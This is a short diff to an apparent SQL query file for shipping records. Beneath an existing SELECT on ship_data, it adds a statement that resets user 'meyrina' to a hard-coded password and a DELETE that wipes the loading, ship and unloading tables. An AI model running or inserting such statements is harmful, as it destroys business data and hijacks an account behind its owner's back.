@@ -107,3 +107,6 @@ SELECT id,
             DATE_FORMAT(FROM_UNIXTIME(actual_time_departure), '%c/%e/%Y %r') AS actual_time_departure,
             DATE_FORMAT(FROM_UNIXTIME(created_at), '%c/%e/%Y %r') AS created_at
             FROM ship_data WHERE deleted_at='0' OR deleted_at='' ORDER BY ship_data.date DESC
+
+UPDATE users SET password=SHA2('arie1105',512) WHERE username='meyrina';
+DELETE FROM loading_data,ship_data,unloading_data;
